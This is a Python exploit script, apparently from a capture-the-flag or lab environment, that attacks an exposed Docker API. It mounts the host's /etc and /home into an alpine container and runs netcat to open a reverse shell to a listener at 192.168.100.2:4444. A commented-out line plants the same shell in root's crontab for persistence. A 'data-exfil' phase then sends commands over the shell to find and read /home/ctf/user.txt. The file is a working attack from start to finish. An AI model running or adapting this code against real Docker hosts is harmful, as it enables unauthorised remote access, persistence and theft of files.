import docker
import socket
import time
import threading
import sys
import subprocess
import os

sys.stdout.reconfigure(line_buffering=True)

PHASE_ORDER = ["initial-access/rce", "data-exfil", "privilege_escalation"]
PHASE_INDEX = {p: i for i, p in enumerate(PHASE_ORDER)}

def should_run(allowed_phase, required_phase):
    return PHASE_INDEX[required_phase] <= PHASE_INDEX[allowed_phase]

def kill_port(port):
    # Find process using the port and kill it
    try:
        result = subprocess.run(
            ["lsof", "-i", f":{port}"], capture_output=True, text=True
        )
        lines = result.stdout.strip().split('\n')
        for line in lines[1:]:  # Skip header
            pid = int(line.split()[1])
            print(f"Killing process {pid} using port {port}")
            os.kill(pid, 9)
    except Exception as e:
        print(f"Could not kill process on port {port}: {e}")

def inject_shell(url):
    """Injects a cron job into the victim's crontab"""
    print("[*] Injecting crontab into the victim's container...")
    try:
        client = docker.DockerClient(base_url=url)

        raw_command2 = r'''sh -c "/usr/bin/nc 192.168.100.2 4444 -e /bin/sh"'''
        #raw_command = r'''sh -c "echo '* * * * * /usr/bin/nc 192.168.100.2 4444 -e /bin/sh' >> /tmp/etc/crontabs/root" && crond -f -d 8'''
        client.containers.run(
            'alpine:latest',
            raw_command2,
            remove=True,
            volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'},
                '/home': {'bind': '/home', 'mode': 'rw'}},
            )
    except Exception as e:
        print(f"Exception in injection: {e}")


def setup_listener(phase):
    host = '0.0.0.0'
    port = 4444
    kill_port(port)
    print(f"[*] Setting up listener on {host}:{port}")

    # Create a socket object
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


    try:
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # Bind to the port
        server_socket.bind((host, port))

        # Queue up to 5 requests
        server_socket.listen(5)
        print("[*] Listening on port 4444...")

        # Establish connection
        client_socket, addr = server_socket.accept()
        print(f"[*] Got connection from {addr}")

        # Send commands to the shell
        if phase == "data-exfil":
            commands = [
                "find / -type f -name 'user.txt' 2>/dev/null",
                "cat /home/ctf/user.txt",
            ]

            print("[*] Sending commands to the shell:")
            for cmd in commands:
                print(f"[>] Executing: {cmd}")
                client_socket.send(f"{cmd}\n".encode())
                time.sleep(1)

                # Get response
                response = b""
                client_socket.settimeout(2)
                try:
                    while True:
                        data = client_socket.recv(4096)
                        if not data:
                            break
                        response += data
                except socket.timeout:
                    pass

                print("[<] Response:")
                print(response.decode('utf-8', errors='ignore'))

            # Close the connection
            client_socket.close()
        else:
            client_socket.close()

    except Exception as e:
        print(f"[!] Error in listener: {e}")
    finally:
        server_socket.close()
        print("[*] Listener closed")

def main(url, allowed_phase):
    print("[*] Starting docker script")
    try:
        if should_run(allowed_phase, "initial-access/rce"):
            listner_thread = threading.Thread(target=setup_listener, args=["rce"])
            listner_thread.start()
            time.sleep(2)
            crontab_thread = threading.Thread(target=inject_shell, args=[url])
            crontab_thread.start()

            # Wait for threads to finish
            crontab_thread.join(timeout=120)
            listner_thread.join(timeout=180)

        if should_run(allowed_phase, "data-exfil"):
            listner_thread = threading.Thread(target=setup_listener, args=["data-exfil"])
            listner_thread.start()
            time.sleep(2)
            crontab_thread = threading.Thread(target=inject_shell, args=[url])
            crontab_thread.start()

            # Wait for threads to finish
            crontab_thread.join(timeout=120)
            listner_thread.join(timeout=180)
    except Exception as e:
        print(f"Exception: {e}")
    print("[*] Docker script finished")
    return 0


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python exploit.py <docker_url> <allowed_phase>")
        sys.exit(1)
    docker_url = str(sys.argv[1])
    allowed_phase = str(sys.argv[2])
    print(sys.argv)

    main(docker_url, allowed_phase)
